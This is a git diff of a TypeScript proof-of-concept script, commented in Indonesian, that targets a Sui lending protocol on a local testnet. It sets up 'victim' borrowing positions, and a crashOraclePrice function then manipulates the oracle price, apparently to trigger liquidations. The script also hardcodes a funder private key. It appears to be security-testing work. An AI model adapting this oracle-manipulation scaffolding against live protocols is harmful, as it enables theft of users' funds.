@@ -13,22 +13,22 @@ import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
 const client = new SuiClient({ url: 'http://127.0.0.1:9000' });
 
 // ==================== KONFIGURASI LOCAL TESTNET ====================
-// Diambil dari output_protocol.json.txt
-const PKG = "0x4447fa7f281993207692ba0eeff209c699316c0fbdc42c5a1e27e59d4dd6fd60"; // Package ID Protokol baru
-const VERSION = "0xa7f721da1598fd7ba932ed3ef85958ada1318cc8697df2a30e2491d7e0a9c6d2"; // Version ID baru
-const MARKET = "0x6044e8e1a7a3d768474678f93a80dee16921ee712768b22c2c70b4486f0cd49d"; // Market ID baru
-const ORACLE = "0x3a7e716c73f7f0471bf7221aea3d31e3729ec0dbd1cf62da73cedbb03ce75d1e"; // Oracle ID baru
-const REGISTRY = "0xa9f387b821f15ef02e151facd8fdcffe1c14a766538f677d8dd8b95a8c751fee"; // Registry ID baru
+// ID Valid dari output_protocol.json.txt (Epoch 9)
+const PKG = "0x4447fa7f281993207692ba0eeff209c699316c0fbdc42c5a1e27e59d4dd6fd60";
+const VERSION = "0xa7f721da1598fd7ba932ed3ef85958ada1318cc8697df2a30e2491d7e0a9c6d2";
+const MARKET = "0x6044e8e1a7a3d768474678f93a80dee16921ee712768b22c2c70b4486f0cd49d";
+const ORACLE = "0x3a7e716c73f7f0471bf7221aea3d31e3729ec0dbd1cf62da73cedbb03ce75d1e";
+const REGISTRY = "0xa9f387b821f15ef02e151facd8fdcffe1c14a766538f677d8dd8b95a8c751fee";
 const CLOCK = "0x6";
 
-// Diambil dari output_testcoin (2).json.txt
-const TEST_COIN_PKG = "0x0e027cb787e9735b869ad976bb6b2d4497d0addb415e1372cbfca2784a953ab0"; // Package ID Test Coin baru
+// ID Valid dari output_testcoin (2).json.txt (Epoch 10)
+const TEST_COIN_PKG = "0x0e027cb787e9735b869ad976bb6b2d4497d0addb415e1372cbfca2784a953ab0";
 const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
 const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
 const SUI_TYPE = "0x2::sui::SUI";
 
-const USDC_TREASURY = "0xc2deb84266c8ef88d43f35dba448c896f806e662e0b562de4c5f62f36cf49711"; // Treasury USDC baru
-const ETH_TREASURY = "0xab8944a758a3a3de2d6c8a6a9dac3dad5ced71ac9885f51327c1523ec77a1336"; // Treasury ETH baru
+const USDC_TREASURY = "0xc2deb84266c8ef88d43f35dba448c896f806e662e0b562de4c5f62f36cf49711";
+const ETH_TREASURY = "0xab8944a758a3a3de2d6c8a6a9dac3dad5ced71ac9885f51327c1523ec77a1336";
 
 // PRIVATE KEY FUNDER
 const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
@@ -76,7 +76,7 @@ async function findCoinMetadata(coinType: string): Promise<string> {
 async function getXOraclePackage(): Promise<string> {
     console.log("[INIT] Extracting XOracle Package ID...");
     const obj = await client.getObject({ id: ORACLE, options: { showType: true } });
-    const type = obj.data?.type; // e.g., "0x123...::x_oracle::XOracle"
+    const type = obj.data?.type;
     const match = type?.match(/^(0x[0-9a-fA-F]+)::/);
     if (!match) throw new Error("Failed to parse XOracle package ID from ORACLE object type");
     console.log(`[INIT] XOracle Package ID: ${match[1]}`);
@@ -129,20 +129,17 @@ async function readObligationState(obligationId) {
 async function initializeMarket(adminCapId) {
     console.log("\n[INIT] Initializing Market (Whitelist, Models, Oracle)...");
     
-    // Cari CoinMetadata ID secara dinamis
     const suiMetaId = await findCoinMetadata(SUI_TYPE);
     const usdcMetaId = await findCoinMetadata(USDC_TYPE);
     const ethMetaId = await findCoinMetadata(ETH_TYPE);
 
     const tx = new Transaction();
 
-    // 1. Allow all whitelist
     tx.moveCall({
         target: `${PKG}::app::whitelist_allow_all`,
         arguments: [tx.object(adminCapId), tx.object(MARKET)],
     });
 
-    // 2. Initialize Market Coin Price Table (WAJIB sebelum mint/supply)
     tx.moveCall({
         target: `${PKG}::app::init_market_coin_price_table`,
         arguments: [tx.object(adminCapId), tx.object(MARKET)],
@@ -221,7 +218,7 @@ async function initializeMarket(adminCapId) {
         });
     };
 
-    // --- TAMBAHAN BARU: setSupplyLimit ---
+    // FIX: Tambahkan fungsi setSupplyLimit untuk mencegah abort di mint::mint
     const setSupplyLimit = (coinType, limit) => {
         tx.moveCall({
             target: `${PKG}::app::update_supply_limit`,
@@ -245,7 +242,7 @@ async function initializeMarket(adminCapId) {
     });
     addLimiter(SUI_TYPE, 10n ** 15n, 86400, 1800);
     setMinCollateral(SUI_TYPE, 0n);
-    setSupplyLimit(SUI_TYPE, 10n ** 18n); // <-- FIXED
+    setSupplyLimit(SUI_TYPE, 10n ** 18n);
 
     // USDC
     registerDecimals(USDC_TYPE, usdcMetaId);
@@ -262,7 +259,7 @@ async function initializeMarket(adminCapId) {
     });
     addLimiter(USDC_TYPE, 10n ** 15n, 86400, 1800);
     setMinCollateral(USDC_TYPE, 0n);
-    setSupplyLimit(USDC_TYPE, 10n ** 18n); // <-- FIXED
+    setSupplyLimit(USDC_TYPE, 10n ** 18n);
 
     // ETH
     registerDecimals(ETH_TYPE, ethMetaId);
@@ -279,7 +276,7 @@ async function initializeMarket(adminCapId) {
     });
     addLimiter(ETH_TYPE, 10n ** 15n, 86400, 1800);
     setMinCollateral(ETH_TYPE, 0n);
-    setSupplyLimit(ETH_TYPE, 10n ** 18n); // <-- FIXED
+    setSupplyLimit(ETH_TYPE, 10n ** 18n);
 
     await executeTx(tx, funderKeypair);
     console.log("[INIT] Market initialized successfully!");
@@ -307,14 +304,12 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
     console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);
 
-    // --- STEP 1: Fund victim dengan 1010 SUI ---
     const fundTx = new Transaction();
     const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1_010_000_000_000n]);
     fundTx.transferObjects([suiCoin], victimAddr);
     await executeTx(fundTx, funderKeypair);
     console.log(`[${label}] Step 1 done: Funded victim with 1010 SUI`);
 
-    // --- STEP 2: Open Obligation menggunakan open_obligation_entry ---
     const openTx = new Transaction();
     openTx.moveCall({
         target: `${PKG}::open_obligation::open_obligation_entry`,
@@ -340,10 +335,8 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     console.log(`[${label}] Obligation ID:    ${obligationId}`);
     console.log(`[${label}] ObligationKey ID: ${obligationKeyId}`);
 
-    // --- STEP 2.5: Whitelist victim address di market ---
     await whitelistVictim(adminCapId, victimAddr, label);
 
-    // --- STEP 3: Deposit SUI Collateral ---
     const depositTx = new Transaction();
     const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]);
     depositTx.moveCall({
@@ -359,7 +352,6 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     await executeTx(depositTx, victimKeypair);
     console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);
 
-    // --- STEP 4: Mint & Supply USDC & ETH ke Market ---
     const supplyTx = new Transaction();
 
     const [usdcCoin] = supplyTx.moveCall({
@@ -395,7 +387,6 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     await executeTx(supplyTx, funderKeypair);
     console.log(`[${label}] Step 4 done: Minted and supplied USDC and ETH to market`);
 
-    // --- STEP 4.5: Set Oracle Prices ke $1 (SUI), $1 (USDC), $2000 (ETH) ---
     const initPriceTx = new Transaction();
     
     initPriceTx.moveCall({
@@ -419,7 +410,6 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     await executeTx(initPriceTx, funderKeypair);
     console.log(`[${label}] Step 4.5 done: Initialized oracle prices (SUI=$1, USDC=$1, ETH=$2000)`);
 
-    // --- STEP 5: Borrow USDC ---
     const borrowUSDCTx = new Transaction();
     const [borrowedUSDC] = borrowUSDCTx.moveCall({
         target: `${PKG}::borrow::borrow`,
@@ -439,7 +429,6 @@ async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
     await executeTx(borrowUSDCTx, victimKeypair);
     console.log(`[${label}] Step 5 done: Borrowed 500 USDC`);
 
-    // --- STEP 6: Borrow ETH ---
     const borrowETHTx = new Transaction();
     const [borrowedETH] = borrowETHTx.moveCall({
         target: `${PKG}::borrow::borrow`,
@@ -475,7 +464,7 @@ async function crashOraclePrice(xOraclePkg) {
         arguments: [
             tx.object(ORACLE),
             tx.object(CLOCK),
-            tx.pure.u64(40_000_000n), // $0.40
+            tx.pure.u64(40_000_000n),
         ],
     });
     
@@ -618,7 +607,6 @@ async function main() {
     const adminCapId = await findAdminCap();
     const xOraclePkg = await getXOraclePackage();
 
-    // INISIALISASI MARKET SEBELUM MEMULAI PoC
     await initializeMarket(adminCapId);
 
     const victimA = Ed25519Keypair.generate();
